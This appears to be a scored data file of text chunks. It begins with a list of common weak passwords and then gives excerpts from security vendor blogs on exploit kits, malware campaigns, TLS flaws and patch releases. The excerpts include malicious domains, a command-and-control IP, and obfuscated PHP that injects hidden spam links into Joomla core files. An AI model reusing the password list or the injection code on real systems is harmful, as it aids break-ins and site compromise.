36123123123,0.009073232673318055
37guest,0.009063686550040861
38guest123,0.008691217607318946
39user,0.007972616415038769
40user123,0.00868024147444224
41121212,0.009062118018128396
42qwert,0.011837182974064775
431qaz2wsx,0.006979688544985874
44qwerty123,0.011058236076833428
45987654321,0.008210516413187596
46pass123,0.009668431952346346
47trewq,0.009865426779158137
49trewq321,0.010068129698808548
49trewq1234,0.009135394970938626
502014,0.009195776353534413
"More recent campaigns for spreading BlackEnergy Lite were active in August and even currently in September, according to ESET LiveGrid® threat telemetry system. In one case, specially crafted PowerPoint documents were used, while other attempts to disseminate the malware appear to have been using unidentified Java vulnerabilities, or the remote control software Team Viewer.",0.014969156389829208
"More details about these cases will be given on Thursday at the Virus Bulletin conference and published afterwards.
",0.02212565571301517
Quicktime and SCUP,0.008093680750537402
"Posted by Roger on 6 September 2010, 8:43 am",0.01140160080338326
"When Quicktime 7.6.7 came out, I wanted to deploy it with Microsoft System Center Update Publisher (SCUP).   I’d recently used SCUP to deploy Flash (for IE) and the Dell Inventory Agent.   It made sense to look at using SCUP and SCCM Software Updates to deploy patches rather than continuing to use the old Software Distribution method.   The funny thing was, when I Googled/Binged Quicktime and SCUP, I didn’t find a lot of answers.   I found a link or two to my blog.   Well, I better actually write something since the search engine expects me to have it.
SCUP can deploy MSP, MSI or EXE.   In the past I had used a BAT file to set registry keys, copy configuration files and run the install.   So that isn’t going to happen unless I compile that into a EXE.    Quicktime also requires the update of Apple Application Support.
I decided to use my old friend SMS Installer to package the install files into one EXE and perform the installation actions.    I decided to make it as simple as possible.   The SMS install script is something like this:
Get Environment Variable %WinDir% into variable windir
Install File \\server\sourceDIR\quicktime to %empt\quicktime\
Execute %temp%\quicktime\appleapplicationsupport.msi /qn reboot=reallysuppress (wait)
Execute %temp%\quicktime\quicktime.msi
ALLUSERS=1 DESKTOP_SHORTCUTS=0 QTTASKRUNFLAGS=0 REGSRCH_INSTALL_ASU=0 /qn reboot=reallysuppress (wait)
The command-line options seem to kept the “Q” systtray icon or desktop shortcuts from occurring.   But I didn’t manage to disable checking for updates when Quicktime is opened.   It also has the really annoying new interface.   In the past I solved those problems by dropping configuration files.   That could still be done with a bit more testing.
Compile your EXE in SMS Installer (or your favorite tool to create an install file).
Once you’re install file is ready to go you’re ready to add it to SCUP.   Select Create Update and run through the wizard.
Update Information
Update Title: Quicktime 7.6.7   (this could be anything)
Description:  Quicktime 7.6.7 improves security and is recommended for all Quicktime 7 users on Windows.   (generally I take the description from the security advisory)
Classification: Security Advisory
Bulletin ID: HT4290
Vendor: Apple
Product: Quicktime
Extended Properties
Artcle ID: HT4290
CVE ID: CVE-2010-1799
Severity: Critical
Support URL:  could be an internal url or http://www.apple.com/quicktime/download
More Info URL: http://support.apple.com/kb/HT4290
Impact: Normal
Reboot Behavior: I left this on ‘can request reboot’ although SMS Installer is returning a 0 by default
Define prerequisite Rules
Processor Architecture = x86
and
Windows Version Greater than or Equal to
major Version 5, SP Major Version 2, Minor Version 1
Product Type = workstation
Apple supports Quicktime on XPsp2 or greater.   Apple uses a separate install file for x64.   I chose keep things simple for now and not try to package that in here.
Select Package
Installer Type = EXE
Update Package Source = Browse to your install file (I used UNC path)   doesn’t need to be accessible to anything but your installer.
Download URL or UNC = Paste the same path as above.
Command Line = /S   (this tells the SMS installer file to run silently.   If you used a different packager you’re on your own)
Define Applicability Rules
File Version:
Common Paths – select program_files
Path – quicktime\quicktimeplayer.exe
Comparison – Less than
Version – 7.67.75.0
AND
Registry key exists
HKLM\Software\Apple Computer, Inc.\Quicktime
Define Installed Rules
File Version
Common Paths – Program_Files
Path – quicktime\quicktimeplayer.exe
Comparison – Greater Than or Equal To
Version 7.67.75.0
Now you’ve got an update that is ready to go.   Publish it to WSUS and then sync to SCCM as you would with any other SCUP update.    I always see people complaining that very few venders supply CAB files for SCUP.   The fact is before this year, very few SCCM admins were using SCUP.   Vender supplied CABs might not be configured they way you want anyway.   For example the Adobe CAB for Flash assumes you want all your computers to have Flash.   If you only want to upgrade existing Flash you need to either collection limit the update or write your own detection rules.
I hope reading thought this you understand now how to roll your own update for even a complicated update like Quicktime.   Make sure you thoroughly test your deployment.
",0.01513693317841136
"Adobe Flash Player 0-day Abused In The Wild (CVE-2015-3113), Our Customers Protected",0.010991672946834341
"Websense® Security Labs™ researchers are aware of a vulnerability within Adobe Flash Player, CVE-2015-3113.  Exploitation of  the vulnerability leads to a buffer overflow which can be abused by a malware author to execute arbitrary code on the compromised machine.  Adobe have deemed this vulnerability “critical”.
In the wild, exploitation of this vulnerability has been observed using our ThreatSeeker Intelligence Cloud.",0.013955251389314638
"Observed Behaviour In The Wild
Websense Security Labs have been tracking abuse of this 0-day in the wild since the start of June 2015. A typical threat lifecycle is followed from reconnaissance, lure, redirect, exploit, payload, call home.
Observed lure artefacts take the form of emails which contain a link to a website in the Ukrainian TLD space.  The email subject hints at a ""2015 Program Kick Off"" and the body references a meeting for which the recipient is invited to click a link to ""find out more"".
Observed target industries include the engineering and science sectors.",0.013944080202553777
"Exposure
Microsoft Windows 8 users of Google Chrome and Internet Explorer should be automatically updated.
Adobe have advised users of Internet Explorer for Windows 7 and below, as well as users of Firefox on Windows XP, that those platform combinations are known targets.
More information on the vulnerability and affected version is available in Adobe's Security Bulletin APSB15-14.",0.015258959606929245
"Impact
Websense customers are protected against this threat via real-time analytics within ACE, the Websense Advanced Classification Engine,  at the following stages:",0.009148895093461062
"Stage 2 (lure) - ACE has protection for the initial lure emails
Stage 3 (redirect) - ACE has protection for the website used to direct end users to the payload
Further information on the 7 Stages of Advanced Attacks threat lifecycle model can be found here.",0.014138539199190947
"Mitigation
Adobe have released an update to various versions of Flash Player. Customers are encouraged to apply the latest version of Adobe Flash Player as soon as possible.  The latest  versions can be found here: https://get.adobe.com/flashplayer/
An alternative mitigation strategy would be to consider if disabling Flash Player is appropriate in your environment.",0.010442484796501783
"Websense Security Labs will continue to monitor this threat and will provide updates as appropriate.
",0.0181830652712488
"Over the last couple of hours, cybercriminals have started spamvertising millions of emails pretending to be coming from HP ScanJet scanner, in an attempt to trick end and and corporate users into downloading and viewing the malicious .html attachment.
Upon viewing, the document loads the invisible iFrame script, ultimately redirecting the user to a landing URL courtesy of the Black Hole web malware exploitation kit.
More details:",0.013306671822831295
"The ongoing spam campaign is using both, zip attachments containing a malicious executable, and a malicious iFrame loading .html file. Let’s take a closer look at the dynamics behind the campaigns.
Spamvertised subject: Scan from a Hewlett-Packard ScanJet #[random number]
Client-side exploits serving URls: hxxp://mirdymas.ru:8080/forum/showthread.php?page=5fa58bce769e5c2c; hxxp://anapoli.ru:8080/forum/showthread.php?page=5fa58bce769e5c2c
Client-side exploits served: CVE-2010-0188; CVE-2010-1885
Detection rate for a sample malicious .html attachment: MD5: 2e12ae0e2472bcd43e4f08e82faaf561 – detected by 16 out of 42 antivirus scanners as Trojan-Clicker.JS.Iframe.gr; Trojan:JS/BlacoleRef.W
Detection rate for a sample spamvertised malicious .zip archive: MD5: 41f6cd9df05fa7d880061651235d50e0 – detected by 30 out of 41 antivirus scanners as Trojan-Ransom.Win32.PornoAsset!IK; TrojanDownloader.Win32.Deliver.st.
Upon successful client-side exploitation, the campaign drops MD5: 4e0053fe00b65627c07dc8c85c85a351 – detected by 31 out of 42 antivirus scanners as Trojan.Generic.KDV.696365; Trojan.Win32.Yakes.antc; and MD5: 7fe4d2e52b6f3f22b2f168e8384a757e – detected by 28 out of 42 antivirus scanners as Trojan.Win32.Buzus.lxwt; Worm:Win32/Cridex.E.
Once executed, the samples phones back to 87.120.41.155:8080/mx5/in. In fact, we already seen another campaign using the same command and control server, namely, the malicious spam campaign impersonating 123greetings.com. Clearly, both of these campaigns are launched by the same cybercriminal/gang of cybercriminals.
Now let’s take a deeper look into the malicious Black Hole exploit kit landing URLs.
anapoli.ru – 50.56.92.47; 190.120.228.92; 203.80.16.81
Name servers part of the campaign’s infrastructure:
ns1.anapoli.ru – 85.143.166.186
ns2.anapoli.ru – 203.172.140.202
ns3.anapoli.ru – 87.120.41.155
ns4.anapoli.ru – 173.224.208.60
ns5.anapoli.ru – 132.248.49.112
Responding to the same IPs are the following malicious domains and command and control servers:
penelopochka.ru
sergikgorec.ru
kolmykiaonline.ru
mskoblastionline.ru
panalki.ru
flumifrator2unix.ru
mirdymas.ru – 71.89.140.153; 46.51.218.71; 203.80.16.81
Name servers part of the campaign’s infrastructure:
ns1.mirdymas.ru – 85.143.166.186
ns2.mirdymas.ru – 203.172.140.202
ns3.mirdymas.ru – 87.120.41.155
ns4.mirdymas.ru – 173.224.208.60
ns5.mirdymas.ru – 132.248.49.112
Responding to 71.89.140.153 are also the following malicious domains and command and control servers:
gorysevera.ru
pussyriotss.ru
spb-koalitia.ru
ashanrestaurant.ru
panamamoskow.ru
onerussiaboard.ru
We’ve already seen some of these domains in the recently profiled spam campaign that was impersonating 123greetings.com in an attempt to trick end and corporate users into clicking on exploits and malware serving links.
Related name servers used in the campaign’s infrastructure:
gorysevera.ru
ns1.gorysevera.ru – 62.76.190.208
ns2.gorysevera.ru – 203.172.140.202
ns3.gorysevera.ru – 87.120.41.155
ns4.gorysevera.ru – 173.224.208.60
ns5.gorysevera.ru – 132.248.49.112
pussyriotss.ru
ns1.pussyriotss.ru – 62.76.190.208
ns2.pussyriotss.ru – 203.172.140.202
ns3.pussyriotss.ru – 87.120.41.155
ns4.pussyriotss.ru – 173.224.208.60
ns5.pussyriotss.ru – 62.76.188.138
spb-koalitia.ru
ns1.spb-koalitia.ru – 62.76.190.208
ns2.spb-koalitia.ru – 203.172.140.202
ns3.spb-koalitia.ru – 87.120.41.155
ns4.spb-koalitia.ru – 173.224.208.60
ns5.spb-koalitia.ru – 62.76.188.138
ashanrestaurant.ru
ns1.ashanrestaurant.ru – 62.76.190.208
ns2.ashanrestaurant.ru – 203.172.140.202
ns3.ashanrestaurant.ru – 87.120.41.155
ns4.ashanrestaurant.ru – 173.224.208.60
ns5.ashanrestaurant.ru – 132.248.49.112
panamamoskow.ru
ns1.panamamoskow.ru – 62.76.190.208
ns2.panamamoskow.ru – 203.172.140.202
ns3.panamamoskow.ru – 87.120.41.155
ns4.panamamoskow.ru – 173.224.208.60
ns5.panamamoskow.ru – 62.76.188.138
onerussiaboard.ru
ns1.onerussiaboard.ru – 62.76.190.208
ns2.onerussiaboard.ru – 203.172.140.202
ns3.onerussiaboard.ru – 87.120.41.155
ns4.onerussiaboard.ru – 173.224.208.60
ns5.onerussiaboard.ru – 62.76.188.138
The last time we intercepted and profiled a similar campaign, was in March 2012. Back then, the malicious domains were fast-fluxed.
We’ll continue monitoring the development of the campaign, and update this post as soon as new developments emerge.
Webroot SecureAnywhere users are proactively protected from these threats.
You can find more about Dancho Danchev at his LinkedIn Profile. You can also follow him on  Twitter.
",0.014567113849267233
SSL - a FREAKishly long existence,0.010020749564659592
"SSL, widely adopted and living on borrowed time, has clearly had a rough year. After Heartbleed, Poodle, and many other high-profile vulnerabilities comes FREAK (Factoring attack on RSA-EXPORT Keys), which at the time of publication of this blog breaks approximately 36% of all sites trusted by browsers as per this link including websites belonging to the NSA and FBI. About 12% of high-ranked Alexa websites are also believed to be vulnerable to the flaw at this time, thereby placing visitors to these sites at high risk.
Exposure and Impact
The vulnerability, discovered by Karthikeyan Bhargavan at INRIA in Paris and the mitLS team, allows an active attacker to perform a man-in-the-middle attack by downgrading the encrypted connection between a vulnerable client and a server that accepts export-grade RSA keys to 512-bits. The captured key can then be factored using the public cloud in a matter of hours and further be used for decryption of communication between the client and the server. Once the key has been compromised, all personal information, such as passwords and financial data, is at risk.
The origin of the vulnerability lies in the cryptographic export restrictions placed by the U.S. government in the 1990s. The restrictions have been eased since then, but the backdoor of weak encryption has lingered on in software. In the early 1990s, breaking 512-bit encryption required resources beyond the reach of the average attacker. Given the meteoric rise in computing power coupled with the rapid reduction in cost, breaking 512-bit encryption today is no longer considered daunting. Having cryptographic backdoors has backfired once again and has serious implications on the security of the Internet.
Vulnerable servers and clients are ones that either offer the RSA_EXPORT suite or use a version of OpenSSL that is vulnerable to CVE-2015-0204, the CVE identifier assigned to the SSL FREAK vulnerability.
Mitigation
OpenSSL has issued a patch to address the vulnerability in January 2015. Several vendors are in the process of releasing patches for the vulnerability. We strongly recommend the application of patches as soon as they are available.",0.014334402240138044
"Websense® researchers are not aware of active exploitation of this vulnerability at the time of publication of the blog, although man-in-the-middle attacks are rather commonly used in targeted attacks on journalists and high-profile international visitors, as well as by opportunistic attackers.
Websense Security Labs™ will continue to monitor the situation and provide updates as needed.
Contributors: Rajiv Motwani, Cristina Houle, Tamas Rudnai
",0.013485826010597224
"Here be dragons: Explorer “in dangerous territory” after public IE exploit release?
An exploit for a vulnerability which affects all versions of Microsoft’s Internet Explorer has been released as a module for the popular penetration testing tool Metasploit - sparking fears of a new wave of attacks.",0.010302839026317345
2 Oct 2013 - 06:49AM,0.011461831040561865
An exploit for a vulnerability which affects all versions of Microsoft’s Internet Explorer has been released as a module for the popular penetration testing tool Metasploit – sparking fears of a new wave of attacks.,0.011880709719100158
An exploit for a vulnerability which affects all versions of Microsoft’s Internet Explorer has been released as a module for the popular penetration testing tool Metasploit – sparking fears of a new wave of attacks.,0.011880709719100158
"The open-source tool is used to test vulnerabilities, but Lucian Constantin of the IDG News Service said, “An exploit for a vulnerability that affects all versions of Internet Explorer and has yet to be patched by Microsoft has been integrated into the open-source Metasploit penetration testing tool, a move that might spur an increasing number of attacks targeting the flaw.”",0.01095917367896515
"While the vulnerability has not been patched, Microsoft has released a temporary fix-it.",0.012898427062828066
"The module was posted by Metasploit contributor Wei Chen, who said, “Recently the public has shown a lot of interest in the new Internet Explorer vulnerability (CVE-2013-3893) that has been exploited in the wild, which was initially discovered in Japan. At the time of this writing there is still no patch available, but there is still at least a temporary fix-it that you can apply from Microsoft.”",0.008975951108091018
"There have been multiple reports of the exploit being used in the wild, according to a report by PC World. PC World also suggested that while Metasploit is targeted at the researcher community, the release could lead to the exploit code landing in the hands of cybercriminals.",0.015810735533611453
"On September 21, the Internet Storm Center raised its threat level to yellow in response to reports of attacks which exploited the vulnerability, saying, “The Internet Storm Center is beginning to see increased evidence of exploits in the wild regarding Microsoft Security Advisory 2887505. Accordingly, we’re moving the InfoCon up to Yellow.”",0.015652768480507673
"Microsoft has already released an emergency fix for the vulnerability in all versions of Internet Explorer. Microsoft warns that targeted attacks have already attempted to exploit it. Microsoft said that it will provide a more permanent solution – although whether this will be via the next “regular” patch on October 8, or earlier, remains to be seen.",0.014186035328660362
"In a blog post, Dustin Childs of Microsoft’s Security Response Center said that the risks for users lay in attackers compromising trusted websites – or convincing them to click links in emails or instant messages.",0.013516797722473162
"“This issue could allow remote code execution if an affected system browses to a website containing malicious content directed towards the specific browser type,” Childs wrote.  “This would typically occur when an attacker compromises the security of trusted websites regularly frequented, or convinces someone to click on a link in an email or instant message.”",0.012668571388195438
"Child’s post also offers advice on how to mitigate the threat for users continuing to browse via Internet Explorer.
",0.012009298441879257
iPhone (in)security in the enterprise – Followup,0.010620770313506389
"Posted by Roger on 7 April 2010, 8:32 pm",0.012683148288296087
"Back in November I wrote a summary of several concerns we have about the iPhone in the enterprise.
Four months later lets take a look at see what’s changed.
One of the other guys at work took that list of concerns to our AT&T rep, who then took them to a unnamed, untitled Apple contact. Next they ran it the questions by the magic 8 ball. The responses are below.
Problem 1: Encryption and PIN bypasses reported at iPhoneinsecurity.com
Apple’s Response:
We take iPhone security very seriously and have made consistent improvements in all areas.For example, in the most recent iPhone 3.1.3 update we made the changes detailed in the following KB – http://support.apple.com/kb/HT4013 One to highlight is CVE-ID: CVE-2010-0038 related to recovery mode. This is a big improvement to thwart those who are using tools to modify the iPhone software.
That doesn’t really answer the question though. Is the encryption bypass which Zdziarski is only talking to law enforcement about fixed or not? Due to the lack of public disclosure there is no way to know. Zdziarski does mention using recovery mode so it is possible that the attack is patched. But I dont give the benefit of the doubt to non-disclosers.
I suppose some would argue that the evil maid attack allows bypass of Full Disk Encryption on computers so I shouldn’t have my data there either. Of course using a smart card or bitlocker with TPM I could protect myself from this attack.
The evil maid attack requires an attacker to have physical access to the device. Then I log in. The the maid returns to harvest the results. The iPhone encryption bypass can occur when you leave the iPhone unattended for a few minutes. I dont think that is comparable.
2. iphoneinsecurity shows a password bypass in addition to the encryption bypass.
Apple’s” response indicates that the enterprise passcode policy is completely different than the consumer four diget pin and thus not vulnerable. I’m not sure I’m buying that.
3. Lack of Centralized Config Management
Apple’s Response indicates that its possible to force the iphone to have enterprises configuration in order to be able to connect in order to connect to the enterprise. I’m not sure exactly how that is supposed to be done.
Further Apple claims that the iPhone is more secure than the Blackberry because its Unix. Its also more secure because you can only run one application at a time and every app is approved by Apple. lolz.
4. Patching
With the BES we can deploy them as forced updates over the air.
Apple’s Response:
We (Apple) don’t view them as patches, but as major, free OS upgrades and updates..a typical OS update for us is 200-300 meg ( very unwieldy to do OTA) and is packed with useful new features , security upgrades, OS enhancements, etc…
“we dont view them as patches”. Sorry, I didn’t read the rest. Laughing too hard.
5. iTunes
Apple Responded that its best practice to not supply full itunes to everyone. Apparently there is some way to skinny down itunes so its basically a sync software.
6. App Store
This issue goes back to is this a business device or not. Are the users going to have the device on their Apple account and take the applications with them or what?
Apple’s response was basically, yes the user takes the app with them when they leave the company even though the company bought the app.
7. Jailbroken phones maybe less secure.
Apple’s response is dont let jailbroken phones connect to the network. No word on how to do that. Authentication alone doesn’t do that. Is ActiveSync going to check for that? I think not.
8. Repeaters. This is more an ATT issue. If we buy X iphone’s can we get repeaters for free.
",0.018332258560819548
UTM Up2Date 9.209 Released,0.00861414161441254
"Written by
Eric Bégoc",0.010229904213713614
"October 23, 2014",0.008586117196800247
Network up2date UTM UTM 9,0.01007005226623292
"A new Up2Date package for Sophos UTM is available as of today.
This update will disable SSLv3 support for many services to eliminate the risks from CVE-2014-3566 (POODLE).
Furthermore, we have introduced some additional fixes and improved the Up2Date client in anticipation of the ucoming 9.3 release.",0.012136260482256689
"Sophos UTM 9.209 – Details
News",0.009437551210296546
"Security Release
Disable SSLv3 support in many services to remove vulnerability to SSLv3 protocol vulnerability (“POODLE”, CVE-2014-3566)
Improve Up2Date client support for staged rollout of 9.3.
Updating to 9.209 will be required to be able to download the 9.2 to 9.3 Up2Date.",0.011517461287692154
Remarks,0.009780636038266843
System will be rebooted,0.007758715382572667
Bugfixes,0.009816324567177737
"32930 Kernel Panic in 9.206 RIP nf_nat_setup_info+0x209/0x652 [nf_nat]
33159 Timezone update needed for Russia [v9]",0.008286954458956886
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.208008-209008.tgz.gpg",0.009984320006541147
"Up2date MD5sum:
bb4f70cdf89535dff15ff708c14f8354",0.009842514977280725
"File size:
≈32MB",0.00805394794344394
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"Neutrino EK picks up momentum in recent attacks
While overall exploit kit activity has been somewhat low during the past weeks, we have noted some changes in Neutrino, the leading EK in the post Angler era, as well as a spike in its use to infect victims via malvertising attacks.
The Neutrino developers have made some changes to the landing page source code as well as integrated a new exploit. The malware campaigns that once were Angler’s continue to point to Neutrino including a large malvertising attack on top adult sites we detected a few days ago.
In this post, we review noteworthy events that have happened recently.
Neutrino EK core
Landing page changes
Around July 5th, the Neutrino landing page changed patterns by adding some HTML tags and random strings, most likely to make identification harder. The landing page is the first point of contact between the user’s browser and an exploit kit. It typically checks the system for vulnerabilities and then fires up various exploits before eventually dropping the malware payload.
Before July 5th: a script tag with random values precedes the call for the malicious SWF.",0.013250751848178255
"On July 5th: The script tag is still there but we notice the addition of some div tags with text strings, followed by the call for the malicious SWF.",0.009363617606303443
"After July 5th, to present: The script tag is now gone, and numerous div tags are added, also with text strings that change regularly.",0.010870760509027022
"New IE vulnerability added
While Neutrino lacks the sophistication and rapid integration of new exploits which made Angler famous, it is the first to adopt an Internet Explorer vulnerability (CVE-2016-0189) patched by Microsoft in May.
This was originally a zero-day exploited in targeted attacks in South Korea, but the integration into the exploit kit follows a proof of concept published in late June.
Once again, this new vulnerability is bundled with others into a single malicious Flash file, a signature move for Neutrino which likes to use Flash as a multi-purpose weapon.",0.013855689742871435
Distribution campaigns,0.0082534112167294
Hacked sites,0.008147582280210286
"Compromised websites remain one of the top and most reliable distribution vector as website owners often don’t clean up their website or struggle cleaning them up. From those hacked servers, there are various campaigns or gates that perform the final redirection to the exploit kit (EITest, AfraidGate, Darkleech, realstatistics). These were typically the realm of Angler but went to Neutrino when the former disappeared.",0.015535189755156331
Malvertising,0.009352215366543737
"In terms of malvertising activity, we saw a large campaign around July 9th which lasted a few days. This affected several top adult sites which normally attract millions of visitors each day, making them a great malware delivery avenue.
Referer: drtuber.com/video/1107472/subtitled-{NSFW}
-> Neutrino EK: onopphfwll.rcouldpink.top/call/eHVrc252
Keeping ahead of the competition
To be most effective, an exploit kit needs to constantly weaponize the latest vulnerabilities available but also possess some anti detection tricks to make it a stealthy infection delivery platform. It is clear that Neutrino has been adopted as the go-to EK and is being used via different actors in large campaigns with ransomware (Locky) being the most common payload being distributed.
Malwarebytes Anti-Exploit detects and blocks Neutrino which is currently exploiting several Flash Player and Internet Explorer vulnerabilities.
",0.012091872228935485
ASG 8.307 Up2Date Released,0.008209768909123949
"An Up2Date has been released for ASG 8.307 that optimizes the one-touch update to UTM 9 for supported official appliances, and contains some security patches for the Astaro Security Gateway platform. Supported ASG appliances are unlocked and ready for upgrading you to UTM 9 (if you don't see the upgrade option in your Up2Date section, be patient - it will take some hours to fully spread. Note that if you have already downloaded the one-touch upgrade on your appliance, you will need to re-download it so it can use the updated process and bring you to 9.004+ directly. For more information, read on for the rest of the details.",0.011492820701868411
"Written by
Angelo Comazzetto",0.008855311348334505
"November 21, 2012",0.009266635659002653
Network up2date,0.007611986957109407
"An Up2Date has been released for ASG 8.307 that optimizes the one-touch update to UTM 9 for supported official appliances, and contains some security patches for the Astaro Security Gateway platform. Supported ASG appliances are unlocked and ready for upgrading you to UTM 9 (if you don’t see the upgrade option in your Up2Date section, be patient – it will take some hours to fully spread.
Note that if you have already downloaded the one-touch upgrade on your appliance, you will need to re-download it so it can use the updated process and bring you to 9.004+ directly. For more information, read on for the rest of the details.",0.011956561809288058
"ASG 8.307 Up2Date Details
News﻿
• Security Update for SMTP Proxy (Exim CVE-2012-5671)
• Fixed issues with UTM V9 Upgrade and V8 Up2Date interaction
Remarks
• System will be rebooted
• Should be installed before attempting UTM V9 Upgrade
• UTM V9 Upgrade needs to be downloaded again if it already was
Bugfixes
No bugfixes in this release
Download:
Link: ftp.astaro.com/ASG/v8/up2date/u2d-sys-8.307.tgz.gpg
MD5: da4b637d5a853c3a2f6005cbcfed245f
Size: ~23MB
Up2Date Installation:
Sophos Up2Date technology makes it easy to update your Astaro Security Gateway. There are two ways to apply an already-downloaded Up2Date package to the system:",0.011805136923842219
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the ""Watch Up2Date Progress in new window"" and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
ASG Up2Date FTP Mirrors:,0.007038564630511557
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the ASG or UTM features you should post it on our User Bulletin Board. Please indicate the version you are using (e.g. ""[8.307] Configuring IPS for my Network"").
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
There are also UTM 9 demo server environments for public use.",0.015005878794904115
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
Joomla Security – Pornography Spam Campaign in the Wild,0.010540938227057373
"One of the worst experiences for a website owner is finding out that the search results for your site have turned into a pharmacy, a fashion outlet, or even a porn dump.
Those unwanted keywords are a result of Search Engine Poisoning (SEP) attacks. This blackhat SEO technique is used by attackers to take advantage of your rankings on Search Engine Result Pages (SERPs).
One of the ways that hackers avoid being noticed is to hide the spam content from normal visitors. By allowing only search engine crawlers to see them, the spam keywords and links are indexed for ranking but they are not visible to visitors. We still find spam hidden in less sophisticated ways, i.e. hidden divs, negatively-located iframes, etc. Of course, security companies are always trying to detect and remove hidden spam – and we are usually pretty successful.
Black Hat SEO Spammers Target Joomla!
This time I’ll tell you about yet another interesting blackhat SEO attack that we’ve been watching for the last year. Recently, we came across a Joomla website displaying the usual (blackhat) SEO spam warning on SiteCheck. However, in this case, the client had noticed the following additional symptoms:",0.019199917343533768
"Visitors were being redirected if the website was reached through any search engine result link.
In all other cases (not coming from SERPs), the redirects were also being triggered.",0.013043240151344393
"Because of this, there wasn’t any noticeable condition triggering the redirect.
I found the infection below in the Joomla core file ./includes/application.php. This was easy for us to spot since Joomla core files are not supposed to have encoded strings.
$data = $document->render( $this->getCfg('caching'), $params);
$data = str_replace(base64_decode(""VHJhY3RvciBNb3VudGVkIExhbmRz..lvLUZ1ZWwgQ2hpcHBlcnM""),
base64_decode(""VHJhY3RvciBNb3VudGVkIExhbmRzY2..Z1ZWwgQ2hpcHBlcnM8YSBocmVmPSJodHRwOi8vam
F2cmlwLm5ldCIgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlOyBsZWZ0Oi0xMjc1cHg7IHRvcDowIj5qYXZyaXAubmV0PC9hPg""),
$data); JResponse::setBody($data);",0.009450451564485984
"Infecting a core file like application.php is interesting for the attacker because when Joomla creates the application object (which is on every load), it ends up loading the JSite class from the file includes/application.php. This class extends the JApplication class. A similar JAdministrator class in administrator/includes/application.php is used when Joomla creates a backend application object.
After deobfuscation, sure enough, we found the malicious code:
$data = $document->render( $this->getCfg('caching'), $params);
$data = str_replace('Tractor Mounted Landscape and Bio-Fuel Chippers',
'Tractor Mounted Landscape and Bio-Fuel Chippers<a href=\""http[:]//javrip[.]net\""
style=\""position:absolute; left:-1275px; top:0\"">javrip[.]net</a>', $data);
JResponse::setBody($data);",0.011174931751972261
"Therefore, the content above will be injected and the website will arbitrarily redirect the visitor to a porn website: javrip[.]net.
More and More Porn Redirects
With malware infections, there’s only so many places to hide – it’s just a matter of ruling things out until you have your culprit. This time wasn’t any different. I found more files involved with this infection in the template’s directory ./templates/rt_versatility4_j15/index.php:
<?php endif; ?><?php if($_SERVER['REQUEST_URI'] == '/' || $_SERVER['REQUEST_URI'] == '/index.php'
|| $_SERVER['REQUEST_URI'] == '/joomla/') { ?> <a href=""http://gay-file[.]com""
style=""position:absolute; left:-1275px; top:0"">gay-file[.]com</a> <?php } ?>
Here is the list of blackhat websites involved in this redirect infection so far:",0.012185795824129042
"javrip[.]net
gay-file[.]com;
dmmjav[.]com;
filesmonster[.]porn",0.011269409815663156
"Deep Analysis of Blackhat Sites
Let’s try to get more information by taking a look at the first blackhat site we mentioned – javrip[.]net.
The malware campaign redirects users from infected websites to the blackhat site to make it look like it’s getting more pageviews than it actually is. The blackhat sites are not blacklisted because they contain no malicious or dangerous code.  They’re just receiving the traffic coming from “infected” websites to bring more pageviews and visitors, which increases ranking positions by manipulating Google’s algorithm.
Traffic Increase from Spam Redirects
Here is some information about the site:
Server IP: 5.44.218.112
ASN: AS51109
ISP: Camelhost Sia
Server Location: Latvia
Domain Created: 2014-12-12
According to Alexa, this page is popular in Japan and also has 239 daily pageviews (1.30 per visitor), most coming from Japan itself, followed by Taiwan and Peru. It’s also being hosted in Latvia (a country on the Baltic Sea between Lithuania and Estonia).",0.016428175602556827
"Since January 2016, we’ve seen an increase in traffic going to javrip[.]net, an impact of the spam campaign that redirects users to that domain.",0.01656174234187835
"The Joomla! Vulnerability Responsible
According to our research, the majority of identified hacked websites are running Joomla 1.5.26. This version has several security issues, especially in the TinyMCE editor.
If you are using Joomla!, now is a good time to check if your sites are updated. Some high severity vulnerabilities were identified in recent years, especially for those still on the 1.5.x branch. This branch is very dated, and while it’s ill-advised, we understand that you can’t always update. This is where things like cloud WAFs come into play, which can protect your site by virtually patching vulnerabilities like these:",0.010692579371862854
"CVE-2015-8562
Critical 0-day Remote Command Execution Vulnerability in Joomla",0.007616519427164681
"Joomla 1.5.x, 2.x, and 3.x before 3.4.6 allow remote attackers to conduct PHP object-injection attacks and execute arbitrary PHP code via the HTTP user-agent header. It was first exploited in December 2015 and is still happening today.
If you have not updated your Joomla site since then, you are likely already compromised. We have a new guide on how to clean a hacked Joomla site that you can follow. If you are unable to do it yourself, we can help with our professional incident response services.
",0.007764095920118841
"More Adobe Update Information
